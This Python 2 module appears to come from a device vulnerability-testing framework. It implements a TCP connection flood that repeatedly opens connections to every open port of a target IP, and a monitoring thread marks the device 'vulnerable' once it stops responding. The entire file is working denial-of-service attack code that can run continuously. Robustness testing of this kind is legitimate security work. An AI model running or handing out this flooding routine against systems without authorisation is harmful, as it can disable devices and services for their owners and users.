from generic_attack import *
import logging
log = logging.getLogger(__name__)
import socket
import threading

class TcpConnectionFlood(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(TcpConnectionFlood, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        self.running = True
        target = self.device['ip']
        global continuousAttack
        continuousAttack = self.config['continuous_attack']

        if self.device["vulnerable_ports"] is None:
            result.update({"status": "no open ports"})
            return

        if "tcp" not in self.device["vulnerable_ports"].keys():
            result.update({"status": "no open ports"})
            return

        if "open" not in self.device["vulnerable_ports"]["tcp"].keys():
            result.update({"status": "no open ports"})
            return

        """ Send packets
                """
        tstatus = threading.Thread(target=self.deviceStatus, args=(result,))
        tstatus.start()
        global connectionsPerPort
        global start_time
        global counter
        openPorts = self.device["vulnerable_ports"]["tcp"]["open"]
        counter = 0
        connectionsPerPort = dict((el, 0) for el in openPorts)
        start_time = time.time()
        while self.running:
            for port in openPorts:
                if not self.running:
                    break
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    device_addr = (target, port)
                    sock.connect(device_addr)
                except socket.error, msg:
                    pass
                connectionsPerPort[port] = (connectionsPerPort[port] + 1)
                counter = counter + 1

        tstatus.join()
        return

    def deviceStatus(self, result):
        max = 5
        detected = 0
        global connectionsPerPort
        global start_time
        global counter
        while self.running:
            if not self.is_alive():
                detected = detected + 1
                time.sleep(0.1)
                if detected == max:
                    result.update({"status": "vulnerable", "dos-status": "device not responding", "connections": counter,
                       "connection_distribution": connectionsPerPort, "attack_time:": (time.time() - start_time)})
                    global continuousAttack
                    if not continuousAttack:
                        self.running = False
                    return
        result.update({"status": "not_vulnerable", "dos-status": "device responding", "connections": counter,
                       "connection_distribution": connectionsPerPort, "attack_time:": (time.time() - start_time)})
        return

    def shutdown(self):
        self.running = False

    def prerequisite(self):
        return ["PortVulnerabilityTest"]

